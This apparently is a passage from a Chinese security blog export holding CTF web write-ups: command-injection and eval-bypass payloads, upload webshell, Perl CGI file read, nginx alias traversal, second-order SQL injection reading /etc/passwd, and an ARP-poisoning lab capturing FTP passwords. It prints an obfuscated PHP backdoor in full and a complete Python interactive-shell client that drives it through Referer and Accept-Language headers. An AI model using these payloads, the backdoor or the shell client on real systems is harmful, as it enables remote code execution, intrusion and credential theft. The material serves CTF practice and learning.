(!preg_match(&quot;/sh|wget|nc|python|php|perl|\\?|flag|&#125;|cat|echo|\\*|\\^|\\]|\\\\\\\\|&#x27;|\\&quot;|\\|/i&quot;,$num))&#123; echo &quot;my favorite num is:&quot;; system(&quot;echo &quot;.$num); &#125;else&#123; echo &#x27;Bonjour!&#x27;; &#125; &#125; &#125; else &#123; highlight_file(__FILE__); &#125; 0x1代码审计代码意思 输入一个数组stuff,stuff要和array相同，但是$stuff[0] != ‘admin’ 这是一个矛盾的判断，所以要想办法绕过 下面是提交一个数字，通过判断后打印出这个数字并执行system函数 这里一定存在命令执行 题目直接给了源码，并且表明了php版本为5.5.9，那就说明这个题目一定和这个版本的漏洞有关，google一下 https://segmentfault.com/q/1010000003871264，这是与这题很像的一题 php5.5.9的数组的key溢出漏洞 结合上面的题目构造出payload: stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=123 页面成功打印出了my favorite num is:123,说明前面已经绕过成功了 0x2 绕过数字，命令注入因为正则表达式最后的m允许多行匹配，所以这里可以使用%0a绕过数字检测 开始构造出的 stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=123%0als / 成功列出了目录，看到了flag，但是读取的时候发现flag关键被过滤了 所以不得不换一种方法 ls -i # 列出当前⽂件列表，取出inode # find找到对应inode的⽂件 find / -inum # more读取对应的文件 more `find / -inum ` 所以最后的payload: stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=111%0amore `find / -inum 38667190` 参考： https://www.coodesker.com/ https://blog.csdn.net/weixin_44604541/article/details/109365511 bug0x1获得admin权限先注册登录看看，页面功能很简单，当点击manage时，提示需要admin账号才可以，所以接下来就要想办法拿到admin账号 在注册的时候有一个找回密码的功能，当我们点进去的时候可以看到，修改密码只需要生日和地址 这就想到了刚才登录页面显示的个人信息，那么怎么才能拿到admin的个人信息就是一个问题 不妨先抓包看一下，可以看到cookie中有一个user，这个值像是md5，在线解密一下 82ed7a14920dd2db1b6657348656eaa5 7:123 也就是uid+username的md5值，那我们是不是可以伪造一个这样的cookie然后到个人信息的页面提交获取信息 md5(1:amdin)=4b9987ccafacb8d8fc08d22bbca797ba 这样就获取了信息，再去修改密码登录 0x2上传绕过登录后点击manage提示非法IP，直接抓包添加xxf，得到提示 &lt;!-- index.php?module=filemanage&amp;do=???--&gt; 访问一下上面的地址一开始以为do是submit，但是提交没反应，又改成了upload，这样就对了，出来一个上传图片的网页 上传php文件，出现前端检测提示 那就直接抓包，把php改成php5修改了MIME为image/jpeg，但是还是提示可以看出来是一个php文件，可能检测了文件开头信息，那就改成下面格式的一句话木马 获得了flag i-got-id-200题目给了三个页面，其中有一个文件上传的页面，随便上传一个文件可以发现会将文件的内容显示出来，猜测这里使用了param()函数 param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的接收变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的 给了提示Perl File Upload第一次见这个东西，在网上学习了一下 大佬猜测出的后天源码 use strict; use warning; use CGI; my $cgi=CGI-&gt;new; if($cgi-&gt;upload(&#x27;file&#x27;))&#123; my $file=$cgi-&gt;param(&#x27;$file&#x27;); while(&lt;$file&gt;) &#123;print(&quot;$_&quot;);&#125; &#125; 1.抓包修改url和上传内容，修改成如图所示 先读取file.pl文件，盲猜在/var/www/cgi-bin/file.pl，将3部分payload修改 为：/cgi­bin/file.pl?/var/www/cgi-bin/file.pl 利用bash来进行读取当前目录下的文件，将3部分payload修改为：/cgibin/file.pl?/bin/bash%20­c%20ls${IFS}/| 读取当前目录的flag文件内容,将3部分payload修改为：/cgi­bin/file.pl?/flag 参考 Web_php_wrong_nginx_config0x1信息收集进入页面发现要登录，但是没有账号，扫描目录也没发现注册账号的页面，但是发现了robots.txt，其中给了hint.php和hack.php hint.php 配置文件也许有问题呀：/etc/nginx/sites-enabled/site.conf 还有这几个 抓包发现cookie，将其改为1后发现就可以登录了，这里是使用浏览器的cookie编辑插件 登录后的url http://220.249.52.133:35234/admin/admin.php?file=index&amp;ext=php 0x2读取配置文件尝试读取index.php和admin.php源码都失败了，再试试robots.txt中的页面 直接输入路径会跳转到主页不显示内容，可能存在过滤导致文件路径无效 ?file=../../../../etc/nginx/sites-enabled/site.conf&amp;ext= 用双写绕过 ?file=....//....//....//....//etc/nginx/sites-enabled/site.conf&amp;ext= 拿到了配置文件 server &#123; listen 8080; ## listen for ipv4; this line is default and implied listen [::]:8080; ## listen for ipv6 root /var/www/html; index index.php index.html index.htm; port_in_redirect off; server_name _; # Make site accessible from http://localhost/ #server_name localhost; # If block for setting the time for the logfile if ($time_iso8601 ~ &quot;^(\\d&#123;4&#125;)-(\\d&#123;2&#125;)-(\\d&#123;2&#125;)&quot;) &#123; set $year $1; set $month $2; set $day $3; &#125; # Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html sendfile off; set $http_x_forwarded_for_filt $http_x_forwarded_for; if ($http_x_forwarded_for_filt ~ ([0-9]+\\.[0-9]+\\.[0-9]+\\.)[0-9]+) &#123; set $http_x_forwarded_for_filt $1???; &#125; # Add stdout logging access_log /var/log/nginx/$hostname-access-$year-$month-$day.log openshift_log; error_log /var/log/nginx/error.log info; location / &#123; # First attempt to serve request as file, then # as directory, then fall back to index.html try_files $uri $uri/ /index.php?q=$uri&amp;$args; server_tokens off; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root /usr/share/nginx/html; &#125; location ~ \\.php$ &#123; try_files $uri $uri/ /index.php?q=$uri&amp;$args; fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_pass unix:/var/run/php/php5.6-fpm.sock; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param SCRIPT_NAME $fastcgi_script_name; fastcgi_index index.php; include fastcgi_params; fastcgi_param REMOTE_ADDR $http_x_forwarded_for; &#125; location ~ /\\. &#123; log_not_found off; deny all; &#125; location /web-img &#123; //这里存在问题 alias /images/; autoindex on; &#125; location ~* \\.(ini|docx|pcapng|doc)$ &#123; deny all; &#125; include /var/www/nginx[.]conf; 这个文件内容也看不懂，但是知道这里存在问题 location /web-img &#123; alias /images/; autoindex on; &#125; alias,就是给 /web-img，设置了一个别名，当访问/web-img就相当于访问了 /images/ location ^~ /t/ &#123; alias /www/root/html/new_t/; &#125; 如果一个请求的URI是/t/a.html时，web服务器将会返回服务器上的/www/root/html/new_t/a.html的文件。注意这里是new_t，因为alias会把location后面配置的路径丢弃掉，把当前匹配到的目录指向到指定的目录。 autoindex Nginx默认是不允许列出整个目录的。如需此功能，打开nginx.conf文件或你要启用目录浏览虚拟主机的配置文件，在server或location 段里添加上autoindex on 这里将其打开就会导致我们可以访问根目录的所有文件夹 url http://220.249.52.133:35234/web-img../ // web-img../ == /image/../ 相当于回退到了根目录 0x3发现漏洞在/var/www/中发现了一个hack..php.bak，正好是robots.txt中提示的内容 &lt;?php $U=&#x27;_/|U&quot;,&quot;/-/|U&quot;),ar|Uray|U(&quot;/|U&quot;,&quot;+&quot;),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle&#x27;; $q=&#x27;s[|U$i]=&quot;&quot;;$p=|U$ss($p,3);&#125;|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s))&#123;$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui&#x27;; $M=&#x27;l=&quot;strtolower|U&quot;;$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$&#x27;; $z=&#x27;r=@$r[|U&quot;HTTP_R|UEFERER|U&quot;];$r|U|Ua=@$r[&quot;HTTP_A|U|UCCEPT_LAN|UGUAGE|U&quot;];if|U($r|Ur&amp;|U&amp;$ra)&#123;$u=parse_|Uurl($r&#x27;; $k=&#x27;?:;q=0.([\\\\|Ud]))?,|U?/&quot;,$ra,$m)|U;if($|Uq&amp;&amp;$m)&#123;|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=&quot;|Usubst|Ur&quot;;|U|U$s&#x27;; $o=&#x27;|U$l;|U)&#123;for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++)&#123;$o.=$t&#123;$i&#125;|U^$k|U&#123;$j&#125;;&#125;&#125;|Ureturn $|Uo;&#125;$r=$|U_SERV|UE|UR;$r&#x27;; $N=&#x27;|Uf($e)&#123;$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(&quot;/&#x27;; $C=&#x27;an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(&quot;|U&lt;$k&gt;$d&lt;/$k&gt;&quot;|U);@ses|U|Usion_des|Utroy();&#125;&#125;&#125;&#125;&#x27;; $j=&#x27;$k|Uh=&quot;|U|U42f7&quot;;$kf=&quot;e9ac&quot;;fun|Uction|U |Ux($t,$k)&#123;$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U&quot;&quot;;fo|Ur($i=0;$i&lt;&#x27;; $R=str_replace(&#x27;rO&#x27;,&#x27;&#x27;,&#x27;rOcreatrOe_rOrOfurOncrOtion&#x27;); $J=&#x27;kf|U),|U0,3));$p=&quot;|U&quot;;for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0)&#123;$&#x27;; $x=&#x27;r)|U;pa|Urse|U_str($u[&quot;qu|U|Uery&quot;],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(&quot;/([\\\\|U|Uw])[|U\\\\w-]+|U(&#x27;; $f=str_replace(&#x27;|U&#x27;,&#x27;&#x27;,$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C); $g=create_function(&#x27;&#x27;,$f); $g(); ?&gt; 又是一段奇奇怪怪的代码 但是能看懂最后三行是生成了一个$g函数，而且是由$f生成的，那么久将$f打印出来看看，在线格式化后如下 是一个后门程序，但是如何利用是个问题，实在太菜了，都看不懂写的是什么，只好找到wp $kh=&quot;42f7&quot;; $kf=&quot;e9ac&quot;; function x($t,$k) &#123; $c=strlen($k); $l=strlen($t); $o=&quot;&quot;; for ($i=0;$i&lt;$l;) &#123; for ($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) &#123; $o.=$t &#123; $i &#125; ^$k &#123; $j &#125; ; &#125; &#125; return $o; &#125; $r=$_SERVER; $rr=@$r[&quot;HTTP_REFERER&quot;]; $ra=@$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;]; if($rr&amp;&amp;$ra) &#123; $u=parse_url($rr); parse_str($u[&quot;query&quot;],$q); $q=array_values($q); preg_match_all(&quot;/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/&quot;,$ra,$m); if($q&amp;&amp;$m) &#123; @session_start(); $s=&amp;$_SESSION; $ss=&quot;substr&quot;; $sl=&quot;strtolower&quot;; $i=$m[1][0].$m[1][1]; $h=$sl($ss(md5($i.$kh),0,3)); $f=$sl($ss(md5($i.$kf),0,3)); $p=&quot;&quot;; for ($z=1;$z&lt;count($m[1]);$z++)$p.=$q[$m[2][$z]]; if(strpos($p,$h)===0) &#123; $s[$i]=&quot;&quot;; $p=$ss($p,3); &#125; if(array_key_exists($i,$s)) &#123; $s[$i].=$p; $e=strpos($s[$i],$f); if($e) &#123; $k=$kh.$kf; ob_start(); @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;,&quot;/-/&quot;),array(&quot;/&quot;,&quot;+&quot;),$ss($s[$i],0,$e))),$k))); $o=ob_get_contents(); ob_end_clean(); $d=base64_encode(x(gzcompress($o),$k)); print(&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;); @session_destroy(); &#125; &#125; &#125; &#125; 做个分析 先是预定义阶段 , 定义了两个字符串和一个 x() 函数 然后获取攻击者发送的数据 , 这里攻击代码是通过 Referer 字段传输的 注意正则函数 preg_match_all() , 该函数从 Accept-Language 取值 , 然后通过正则匹配后输出到 $m 数组中 然后拼接了前两种可选语言的首字母 , 和预定义的字符串拼接并进行 md5 校验 , 截取等操作 . 然后赋值给 $h 和 $f 两个变量 循环中的 $p .= $q[$m[2][$z]] 会不断从 $q 中提取数据 . 结合之前的代码 , 攻击代码是放在 Referer 中的( 最后会放在 $q 中 ) , 因此这里可以看作是拼接攻击代码 , 组合成 Payload . 然后判断 $h 是否出现在 Payload 的开头 , 若是则设置 $_SESSION[&#39;$i&#39;] = &quot;&quot; , 同时删除 Payload 的 $h 部分 . 接着判断 $_SESSION 中那个是否存在 $i 这个键名 , 若是则将 Payload 赋值给 $_SESSION[$i] , 然后查找 $_SESSION[$i]( 也就是 Payload ) 中 $f 第一次出现的位置 . 最后执行payload exp： from random import randint,choice from hashlib import md5 import urllib import string import zlib import base64 import requests import re # 用于生成完整的 Accept-Language from urllib3.connectionpool import xrange from yapf.yapflib.py3compat import raw_input def choicePart(seq,amount): length = len(seq) if length == 0 or length &lt; amount: print(&#x27;Error Input&#x27;) return None result = [] # 结果 indexes = [] # 索引 count = 0 while count &lt; amount: i = randint(0,length-1) if not i in indexes: indexes.append(i) result.append(seq[i]) count += 1 if count == amount: return result # 生成随机填充字符串( 由所有 ASCII 字符组成 , 包括不可读的字符 ) def randBytesFlow(amount): result = &#x27;&#x27; for i in xrange(amount): result += chr(randint(0,255)) return result # 生成随机填充字符串( 由所有大小写字母组成 ) def randAlpha(amount): result = &#x27;&#x27; for i in xrange(amount): # choice() 方法返回一个列表，元组或字符串的随机项 # string.ascii_letters 会生成所有的字母 result += choice(string.ascii_letters) return result # 模拟 x() 函数 , 循环异或加密 def loopXor(text,key): result = &#x27;&#x27; lenKey = len(key) lenTxt = len(text) iTxt = 0 while iTxt &lt; lenTxt: iKey = 0 while iTxt&lt;lenTxt and iKey&lt;lenKey: result += chr(ord(key[iKey]) ^ ord(text[iTxt])) iTxt += 1 iKey += 1 return result # 开启 Debug 选项 def debugPrint(msg): if debugging: print (msg) # 定义基本变量 debugging = False # 默认关闭 Debug , 可用 True 开启 keyh = &quot;42f7&quot; # $kh , 需要修改 keyf = &quot;e9ac&quot; # $kf , 需要修改 xorKey = keyh + keyf # $k url = &#x27;http://111.198.29.45:47960/hack.php&#x27; # 指定 URL , 需要修改 defaultLang = &#x27;zh-CN&#x27; #默认Language languages = [&#x27;zh-TW;q=0.%d&#x27;,&#x27;zh-HK;q=0.%d&#x27;,&#x27;en-US;q=0.%d&#x27;,&#x27;en;q=0.%d&#x27;] #Accept-Language 模板 proxies = None # &#123;&#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125; # 代理 , 可用于 BurpSuite 等 sess = requests.Session() # 创建一个 SESSION 对象 # 每次会话会产生一次随机的 Accept-Language langTmp = choicePart(languages,3) # 输出一个列表 , 包含模板中的三种 Accept-language indexes = sorted(choicePart(range(1,10),3), reverse=True) # 降序排序输出三个权重值 , 例如 [8,6,4] acceptLang = [defaultLang] # 先添加默认Language for i in xrange(3): acceptLang.append(langTmp[i] % (indexes[i],)) # 然后循环添加三种 Accept-Language , 并为其添加权重值 acceptLangStr = &#x27;,&#x27;.join(acceptLang) # 将多个 Accept-Language 用 &quot; , &quot; 拼接在一起 # acceptLangStr 即为要使用的 Accept-Language debugPrint(acceptLangStr) init2Char = acceptLang[0][0] + acceptLang[1][0] # $i md5head = (md5(init2Char + keyh).hexdigest())[0:3] # $h md5tail = (md5(init2Char + keyf).hexdigest())[0:3] + randAlpha(randint(3,8)) # $f + 填充字符串 debugPrint(&#x27;$i is %s&#x27; % (init2Char)) debugPrint(&#x27;md5 head: %s&#x27; % (md5head,)) debugPrint(&#x27;md5 tail: %s&#x27; % (md5tail,)) # 交互式 Shell cmd = &quot;system(&#x27;&quot; + raw_input(&#x27;shell &gt; &#x27;) + &quot;&#x27;);&quot; while cmd != &#x27;&#x27;: # 在写入 Payload 前填充一些无关数据 query = [] for i in xrange(max(indexes)+1+randint(0,2)): key = randAlpha(randint(3,6)) value = base64.urlsafe_b64encode(randBytesFlow(randint(3,12))) query.append((key, value)) # 生成无关数据并填充 debugPrint(&#x27;Before insert payload:&#x27;) debugPrint(query) debugPrint(urllib.urlencode(query)) # 对 Payload 进行加密 payload = zlib.compress(cmd) # gzcompress 操作 payload = loopXor(payload,xorKey) # 循环异或运算 , PHP代码中的 x() 函数 payload = base64.urlsafe_b64encode(payload) # base64_encode 编码 payload = md5head + payload # 在开头补全$h # 对Payload进行修改 cutIndex = randint(2,len(payload)-3) payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail) iPiece = 0 for i in indexes: query[i] = (query[i][0],payloadPieces[iPiece]) iPiece += 1 # 将 Payload 作为查询字符串编码拼接到 Referer 中 referer = url + &#x27;?&#x27; + urllib.urlencode(query) debugPrint(&#x27;After insert payload, referer is:&#x27;) debugPrint(query) debugPrint(referer) # 发送 HTTP GET 请求 r = sess.get(url,headers=&#123;&#x27;Accept-Language&#x27;:acceptLangStr,&#x27;Referer&#x27;:referer&#125;,proxies=proxies) html = r.text debugPrint(html) # 接收响应数据包 pattern = re.compile(r&#x27;&lt;%s&gt;(.*)&lt;/%s&gt;&#x27; % (xorKey,xorKey)) output = pattern.findall(html) # 如果没有收到响应数据包 if len(output) == 0: print (&#x27;Error, no backdoor response&#x27;) cmd = &quot;system(&#x27;&quot; + raw_input(&#x27;shell &gt; &#x27;) + &quot;&#x27;);&quot; continue # 如果收到响应数据包 , 则对其进行处理 output = output[0] debugPrint(output) output = output.decode(&#x27;base64&#x27;) # base64_decode 解码 output = loopXor(output,xorKey) # 循环异或运算 output = zlib.decompress(output) # gzuncompress 运算 print(output) # 输出响应信息 cmd = &quot;system(&#x27;&quot; + raw_input(&#x27;shell &gt; &#x27;) + &quot;&#x27;);&quot; 难度属实有点大了，超出能力范围。 参考 Web_php_wrong_nginx_config WriteUp – H0t-A1r-B4llo0n (guildhab.top) (2条消息) 攻防世界 web高手进阶区 7分题 Web_php_wrong_nginx_config_闵行小鱼塘-CSDN博客 love_math这出题人大意了啊。。。直接可以给显示出来了 还是正常做一做，这题好像有问题，就在buuctf上做了 0x1代码审计&lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[&#x27;c&#x27;]))&#123; show_source(__FILE__); &#125;else&#123; //例子 c=20-1 $content = $_GET[&#x27;c&#x27;]; if (strlen($content) &gt;= 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;]; preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; //帮你算出答案 eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;); &#125; get提交参数c，c的长度不能超过80 不能包括blacklist中的字符 不能有不是$whitelist白名单里面的单词出现 并且函数只能以下面的格式出现 abs(1)能过1abs()能过absa()不能过abs(a)不能过abs()a不能过 代码的最后出现了 eval 这是我们想看到的，因为它出现的时候，就可能存在命令执行漏洞 这题实在是无能为力，看了王师傅的wp 详情看这里 0x2构造payload//这题需要使用到php复杂变量，具体可以看这里 当这个题目没有给出那么限制的时候我们想要构造的payload一定是 ?c=system(&quot;cat /flag&quot;) 但是由于限制，必须想办法绕过这些限制，比如多提交一个参数，构造出上面的payload 比如 ?c=($_GET[b])($_GET[a])&amp;b=system&amp;a=cat /flag //这里是b,a多提交的参数，不会被检测 这里的[]可以使用&#123;&#125;代替 下面的具体工作就是如何利用上面提供的函数构造出 _GET，并且能够绕过检测。 首先看一下函数的白名单里给了哪些可以用的函数base_convert()，dechex 还有一些短的函数名pi,cos,sin,tan等，因为限制了长度，所以要尽量使用短的函数名代替a和b 开始的想法就是将利用base_canvert()，转化出一个_GET，但是发现base_convert()不支持_，并且转换出的字符是小写的 所以这里用到了一个中间过渡的函数hex2bin()，与之功能想反的函数是bin2hex() 实现方法如下 下面就是将_GET转换为十六进制数字 //bin2hex(&quot;_GET&quot;)-&gt;5f474554 ?c=$pi=base_convert(37907361743,10,36)(5f474554);($$pi)&#123;1&#125;(($$pi)&#123;2&#125;)&amp;1=system&amp;2=tac /flag 想法是好的，但是这里不能直接提交，因为不符合上面的几种函数使用的格式 所以就要想办法使用一个函数把5f474554提交上去 这里用的是dechex，就是将十进制数转换为十六进制数，再交给hex2bin出来 所以这里有个逆过程就是将5f474554转换为十进制 intval(&#x27;5f474554&#x27;,16); 所以具体的payload如下 ?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;1&#125;(($$pi)&#123;2&#125;)&amp;1=system&amp;2=tac /flag //base_convert(37907361743,10,36)=&gt;hex2bin //dechex(1598506324)=&gt;5f474554 //hex2bin(&#x27;5f474554&#x27;)=&gt;_GET //$pi=_GET //($_GET)&#123;1&#125;($_GET&#123;2&#125;) 7分的题目果然不一样，看wp都写了好久 既然没有能力自己做出来，那就好好研究一下别人做题的思路，以便以后遇到类似题目能够有思路。 comment0x1扫描目录拿到题目扫 一下目录，发现是出现.git，那应该就是git源码泄露，可是githacker下载下来的文件好像不全，看了看大佬的wp 暂时没搞懂是怎么下载的，日后再看细看 源码如下 &lt;?php include &quot;mysql.php&quot;; session_start(); if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123; header(&quot;Location: ./login.php&quot;); die(); &#125; if(isset($_GET[&#x27;do&#x27;]))&#123; switch ($_GET[&#x27;do&#x27;]) &#123; case &#x27;write&#x27;: $category = addslashes($_POST[&#x27;category&#x27;]); $title = addslashes($_POST[&#x27;title&#x27;]); $content = addslashes($_POST[&#x27;content&#x27;]); $sql = &quot;insert into board set category = &#x27;$category&#x27;, title = &#x27;$title&#x27;, content = &#x27;$content&#x27;&quot;; $result = mysql_query($sql); header(&quot;Location: ./index.php&quot;); break; case &#x27;comment&#x27;: $bo_id = addslashes($_POST[&#x27;bo_id&#x27;]); $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0)&#123; $category = mysql_fetch_array($result)[&#x27;category&#x27;]; $content = addslashes($_POST[&#x27;content&#x27;]); $sql = &quot;insert into comment set category = &#x27;$category&#x27;, content = &#x27;$content&#x27;, bo_id = &#x27;$bo_id&#x27;&quot;; $result = mysql_query($sql); &#125; header(&quot;Location: ./comment.php?id=$bo_id&quot;); break; default: header(&quot;Location: ./index.php&quot;); &#125; &#125; else&#123; header(&quot;Location: ./index.php&quot;); &#125; ?&gt; 可以看到在write部分提交的都是经过转义后带入查询语句查询的，但是下面的comment中category没有经过任何过滤就带入了sql语句进行查询，这就可能存在二次注入。 0x2二次注入进入题目可以提交评论，但是要登录，给了提示 username:zhangwei password:zhangwei*** 使用bp爆破出的密码是zhangwei666 登录后先进入发帖的界面,构造payload $sql &#x3D; &quot;insert into comment set category &#x3D; &#39;$category&#39;, content &#x3D; &#39;$content&#39;, bo_id &#x3D; &#39;$bo_id&#39;&quot;; 之前sql注入方法中经常使用的注释方法都是当行注释，但是这个题目的查询使用的是多行，所以这里注释也需要使用多行注释 /**/ 在这里注入的sql语句，在comment页面会被sql重新调出来，从而执行了注入语句，这也是为啥叫做二次注入 于是构造的sql语句如下 $sql &#x3D; &quot;insert into comment set category &#x3D; &#39;&#39;,content&#x3D;user(),&#x2F;*&#39;, content &#x3D; &#39;*&#x2F;#&#39;, bo_id &#x3D; &#39;$bo_id&#39;&quot;; 因为中间的 cntent被包围在多行注释中间，所以这里不起作用等价于 $sql &#x3D; &quot;insert into comment set category &#x3D; &#39;&#39;,content&#x3D;user(), bo_id &#x3D; &#39;$bo_id&#39;&quot;; 当在评论页面评论*/#时，会与之前的/*的进行闭合，就够造出了我们想要的sql语句，user()这个sql函数就会被执行，显示当前的用户 原理知道了，下面就是具体的做这个题目 首先读取 /etc/passwd 看看服务器上有哪些用户，payload为: ‘,content=(select load_file(‘/etc/passwd’)),/* 可以看到是有www用户的，那么久存在.bash_history 记录，继续查看 title=1&amp;category=&#x27;,content=(select( load_file(&#x27;/home/www/.bash_history&#x27;))),/*&amp;content=11 也就是以下几条指令 cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start 可以看出来 .Ds_Store是存在/tmp/html目录下的，那就看看有什么 直接查看该文件会发现长度不够，而且显示不可见字符 使用hex()就可以解决这个问题 title=1&amp;category=&#x27;,content=(select hex( load_file(&#x27;/tmp/html/.DS_Store&#x27;))),/*&amp;content=11 在线解码后可以看到以下内容，存在一个 flag_8946e1ff1ee3e40f.php 查看flag，但是要注意的是，这个文件是从 /var/www/html/中复制过来的，所以还是要到那个目录读取 title=1&amp;category=&#x27;,content=(select hex( load_file(&#x27;/var/www/html/flag_8946e1ff1ee3e40f.php&#x27;))),/*&amp;content=11 在线解码即可","tags":[]},{"title":"arp attack","date":"2020-11-27T15:51:31.000Z","path":"2020/11/27/attack/","text":"arp攻击ARP（Address Resolution Protocol，地址解析协议是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。 ARP 病毒攻击是局域网最常见的一种攻击方式。由于TCP/IP协议存在的一些漏洞给ARP病毒有进行欺骗攻击的机会，ARP利用TCP/IP协议的漏洞进行欺骗攻击，现已严重影响到人们正常上网和通信安全。当局域网内的计算机遭到ARP的攻击时，它就会持续地向局域网内所有的计算机及网络通信设备发送大量的ARP欺骗数据包，如果不及时处理，便会造成网络通道阻塞、网络设备的承载过重、网络的通讯质量不佳等情况。 攻击原理ARP攻击主要是通过伪造IP地址和MAC地址进行欺骗。使以太网数据包的源地址、目标地址和ARP通信数量剧增导致网络中断或中间人攻击。ARP攻击主要存在于局域网中。若其中一台计算机感染ARP病毒。就会试图通过ARP欺骗截获局域网内其他计算机的信息，造成局域网内的计算机通信故障。 实验机器2003虚拟机，作为ftp服务器 xp虚拟机作为用户访问ftp服务 kali作为攻击方，获取xp登录时的账号密码 xp:10.1.1.3/24 2003:10.1.1.1/24 kali:10.1.1.2/24 实验拓扑图 实验步骤一.检查三台主机的通信情况三台主机通信正常 二.2003开启ftp服务器开启ftp服务，并设置禁止匿名访问 并创建xp访问时需要的使用的账号 username:aaa password:123.com 验证是可以正常访问的 三.kali打开攻击软件打开ettercap-&gt;undefined sniffing-&gt;eth0-&gt;Host-&gt;scan host-&gt;add-&gt;arp posioning-&gt;选择第一项 扫描到两台目标主机，开始arp投毒 此时arp攻击已经开始了 可以看到两个不同的IP对应的确实同一mac地址，当自己的电脑出现这种情况时就可以判断是arp攻击了 四.xp访问ftp服务器，kali抓取到账号密码开始第四步 xp访问ftp并输入账号密码 kali那边已经抓取到 实验结束arp攻击的另外一种形式是利用ARP欺骗，造成局域网内主机通信的失败，就是无法连接网络。实现方法比较简单就不再赘述。","tags":[{"name":"arp","slug":"arp","permalink":"https://sunzhengyu99.github.io/tags/arp/"}]},{"title":"xss和sql注入简单环境的搭建","date":"2020-11-15T08:14:50.000Z","path":"2020/11/15/xss-sql/","text":"xss和sql注入简单环境的搭建以下环境都是基于PHP study搭建的，版本为 php 5.5.38+Apache 参考了dvwa的漏洞源码与攻击方式。 xss漏洞的搭建1.网页源码&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt; 